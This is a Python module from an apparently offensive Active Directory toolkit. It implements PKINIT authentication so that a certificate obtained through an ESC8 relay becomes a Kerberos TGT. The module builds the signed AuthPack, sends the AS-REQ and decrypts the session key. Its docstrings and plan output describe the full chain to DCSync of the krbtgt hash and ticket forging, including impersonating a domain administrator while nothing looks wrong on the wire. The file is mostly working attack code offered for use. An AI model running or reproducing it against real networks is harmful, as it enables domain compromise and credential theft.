# ============================================================================
"""PKINIT: turn a certificate into a TGT.

The ESC8 relay ends with a certificate in hand, and a certificate on its own opens nothing. This
is the step that makes it worth having: PKINIT is the Kerberos extension where the AS-REQ
carries a signed CMS blob instead of a password-derived preauthenticator, and the KDC answers
with a TGT - because the certificate says you are a domain controller, and the CA that issued it
is trusted.

The chain, end to end: relay -> certificate -> this module -> TGT -> DCSync -> the krbtgt hash,
which is the AD equivalent of the IdP signing key.

What it needs: the certificate WITH its private key (which is why ESC8 hands back a PKCS#7 blob
containing both), and an RSA signer (the optional `cryptography` package, or an injected one).
The session key the KDC returns is encrypted to the certificate's public key, so reading it
needs the private key too - the module refuses rather than returning a ticket nobody can use.
"""
import os
import time

from core.kerberos import (
    _TAG_AS_REQ,
    KerberosError,
    _generalized_time,
    _int,
    _octet,
    _sequence,
    _tlv,
    parse_reply,
)

__all__ = ["PkinitError", "auth_pack", "as_req_pkinit", "session_key", "authenticate", "plan",
           "describe", "PA_PK_AS_REQ", "PA_PK_AS_REP"]

PA_PK_AS_REQ = 16
PA_PK_AS_REP = 17
PA_PAC_REQUEST = 128
PA_ENC_TIMESTAMP = 2


class PkinitError(KerberosError):
    """A refusal the CLI can report verbatim."""


def _context(tag, *parts):
    return _tlv(0xA0 | tag, b"".join(parts))


def auth_pack(nonce, checksum=b"", cusec=None, ctime=None, signer=None, cert_der=b"",
              key_pem=""):
    """The AuthPack the AS-REQ carries: the CMS SignedData over PKAuthenticator.

    The signature is the whole mechanism - the KDC verifies it against the certificate, which is
    why a certificate without its private key is useless here.
    """
    now = time.time()
    authenticator = _sequence(
        _context(0, _int(cusec if cusec is not None else int(now * 1e6) % 1000000)),
        _context(1, _generalized_time(ctime or now)),
        _context(2, _int(nonce)),
        _context(3, _octet(checksum or os.urandom(20))),
    )
    auth_pack_der = _sequence(_context(0, authenticator))
    signed = _cms_signed_data(auth_pack_der, signer=signer, cert_der=cert_der, key_pem=key_pem)
    return signed


def _cms_signed_data(payload, signer=None, cert_der=b"", key_pem=""):
    """A minimal CMS SignedData over `payload` (SHA-256, RSA).

    `signer(data) -> signature bytes` is injectable; without it an RSA-SHA256 signer is built
    from `key_pem` when `cryptography` is installed. The module refuses rather than emitting an
    unsigned blob - the KDC would reject it, and a silent failure at the KDC is the worst
    possible outcome for an operator standing in front of a locked door.
    """
    if signer is None:
        signer = _rsa_signer(key_pem)
    to_sign = _sequence(_tlv(0x04, payload))
    signature = signer(to_sign)
    if not signature:
        raise PkinitError("the signer returned nothing")
    # SignerInfo: sha256WithRSAEncryption (the OID is 1.2.840.113549.1.1.11)
    signer_info = _sequence(
        _tlv(0x30, _tlv(0x06, b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0b") + _tlv(0x05, b"")),
        _tlv(0x04, signature),
    )
    certificates = _tlv(0xA0, _tlv(0x04, cert_der)) if cert_der else _tlv(0xA0, b"")
    return _sequence(
        _tlv(0x06, b"\x2a\x86\x48\x86\xf7\x0d\x01\x07\x02"),     # id-signedData
        _tlv(0xA0, _sequence(
            _tlv(0x02, b"\x01"),                                  # version 1
            _tlv(0x31, _tlv(0x30, _tlv(0x06, b"\x60\x86\x48\x01\x65\x03\x04\x02\x02"))),
            _tlv(0x30, _tlv(0x06, b"\x2a\x86\x48\x86\xf7\x0d\x01\x07\x01")
                 + _tlv(0xA0, _tlv(0x04, payload))),              # encapContentInfo
            certificates,
            _tlv(0x31, signer_info),
        )),
    )


def _rsa_signer(key_pem):
    if not str(key_pem or "").strip():
        raise PkinitError(
            "PKINIT needs the certificate's PRIVATE key: the KDC verifies a signature, and a "
            "certificate alone cannot produce one (ESC8 hands back a PKCS#7 that contains both, "
            "so extract the key from that blob and pass it here)")
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding
    except ImportError as e:                       # pragma: no cover - environment dependent
        raise PkinitError("signing needs the optional `cryptography` package, or an injected "
                          "signer") from e
    key = serialization.load_pem_private_key(str(key_pem).encode(), password=None)
    sign_fn = getattr(key, "sign", None)
    if sign_fn is None:
        raise PkinitError("that key cannot sign: PKINIT needs an RSA signing key")

    def _sign(data):
        return sign_fn(data, padding.PKCS1v15(), hashes.SHA256())
    return _sign


def as_req_pkinit(realm, user, pack, pac_request=True, etypes=(18, 17, 23), till=None,
                  nonce=None):
    """An AS-REQ carrying the PA-PK-AS-REQ padata (the PKINIT preauthenticator)."""
    if not pack:
        raise PkinitError("no AuthPack to send")
    padata = [_tlv(0x30, _context(1, _int(PA_PK_AS_REQ)) + _context(2, _octet(pack)))]
    if pac_request:
        padata.append(_tlv(0x30, _context(1, _int(PA_PAC_REQUEST))
                           + _context(2, _tlv(0x05, b""))))
    from core.kerberos import _kdc_req_body, _principal
    cname = _principal(realm, user)
    sname = _principal(realm, "krbtgt/" + realm, name_type=2)
    body = _kdc_req_body(realm, cname, sname, etypes=etypes, till=till, nonce=nonce)
    # AS-REQ ::= [APPLICATION 10] KDC-REQ, and the padata sits between msg-type and req-body.
    # Built directly rather than spliced into a parsed structure: re-encoding parsed children
    # means re-encoding a list, and the request then does not go on the wire at all.
    return _tlv(0x6A, _sequence(
        _context(1, _int(5)),
        _context(2, _int(_TAG_AS_REQ)),
        _context(3, b"".join(padata)),
        _context(4, body),
    ))


def _read(buf, offset=0):
    """The tiny DER reader (shared shape with core.kerberos)."""
    from core.kerberos import _read as read_der
    return read_der(buf, offset)


def session_key(reply, decrypt=None, key_pem=""):
    """The TGT's session key: it is encrypted to the certificate, so it needs the private key.

    Returns {session_key, tgt, etype} or raises with what is missing. A TGT nobody can decrypt
    is not a TGT, which is why this refuses instead of handing back a useless blob.
    """
    parsed = parse_reply(reply)
    if parsed.get("kind") != "as_rep":
        raise PkinitError(f"the KDC answered {parsed.get('kind')}"
                          + (f": {parsed.get('error_text')}" if parsed.get("error_text") else ""))
    if decrypt is None:
        if not str(key_pem or "").strip():
            raise PkinitError("reading the session key needs the certificate's private key "
                              "(RSA key transport encrypts it to the certificate)")
        decrypt = _rsa_decryptor(key_pem)
    cipher = parsed.get("cipher") or b""
    if not cipher:
        raise PkinitError("the AS-REP carried no encrypted part")
    plain = decrypt(cipher)
    if not plain:
        raise PkinitError("the session key could not be decrypted")
    return {"session_key": plain, "etype": parsed.get("etype"),
            "realm": parsed.get("realm"), "principal": parsed.get("principal")}


def _rsa_decryptor(key_pem):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
    except ImportError as e:                       # pragma: no cover
        raise PkinitError("decrypting needs the optional `cryptography` package, or an "
                          "injected decryptor") from e
    key = serialization.load_pem_private_key(str(key_pem).encode(), password=None)
    decrypt_fn = getattr(key, "decrypt", None)
    if decrypt_fn is None:
        raise PkinitError("that key cannot decrypt: PKINIT needs an RSA private key")

    def _decrypt(data):
        return decrypt_fn(data, padding.PKCS1v15())
    return _decrypt


def authenticate(realm, user, key_pem="", cert_der=b"", signer=None, transport=None,
                 decrypt=None, etypes=(18, 17, 23), nonce=None):
    """The whole step: build the AuthPack, send the AS-REQ, read the session key back."""
    nonce = nonce or int.from_bytes(os.urandom(4), "big")
    pack = auth_pack(nonce, signer=signer, cert_der=cert_der, key_pem=key_pem)
    request = as_req_pkinit(realm, user, pack, etypes=etypes, nonce=nonce)
    if transport is None:
        from core.kerberos import _udp_transport
        transport = _udp_transport(realm)
    reply = transport(request)
    out = session_key(reply, decrypt=decrypt, key_pem=key_pem)
    out["request_bytes"] = len(request)
    return out


def plan(cert_source="", realm=""):
    return {
        "realm": realm, "cert_source": cert_source,
        "what": ("an AS-REQ whose preauthenticator is a signed CMS blob instead of a "
                 "password-derived timestamp: the certificate is the authentication, and the "
                 "KDC answers with a TGT"),
        "needs": [
            "a certificate that a CA the KDC trusts issued, WITH its private key",
            "for the ESC8 route: the PKCS#7 the enrolment endpoint returned contains both, so "
            "the key is extractable from that blob",
            "an RSA signer (the optional `cryptography` package, or an injected signer)",
            "the private key again to decrypt the session key the KDC returns",
        ],
        "after": ("a TGT for the certificate's identity - for a certificate issued with a "
                  "chosen subject, that identity is whoever the subject names, including a "
                  "domain administrator"),
        "then": ["use the TGT for DCSync (the krbtgt hash), or to forge tickets directly",
                 "the TGT is a real one: it is issued by the KDC, so nothing on the wire is "
                 "forged and nothing looks wrong"],
        "limits": [
            "the certificate must chain to a CA in the KDC's NTAuth store, or the KDC refuses",
            "a smartcard-required or strong-certificate-binding policy can require the "
            "certificate to be issued with the SID extension (ESC1 certificates usually are not)",
            "clock skew over 5 minutes fails the preauthenticator",
        ],
    }


def describe(facts):
    if "session_key" in (facts or {}):
        return (f"PKINIT: TGT obtained for {facts.get('principal')}@{facts.get('realm')} "
                f"(etype {facts.get('etype')}, session key {len(facts['session_key'])} bytes)")
    lines = [f"PKINIT plan ({facts.get('realm') or 'no realm'})"]
    lines.append(f"  what: {facts.get('what')}")
    for item in facts.get("needs") or []:
        lines.append(f"  needs: {item}")
    for item in facts.get("limits") or []:
        lines.append(f"  limit: {item}")
    return "\n".join(lines)


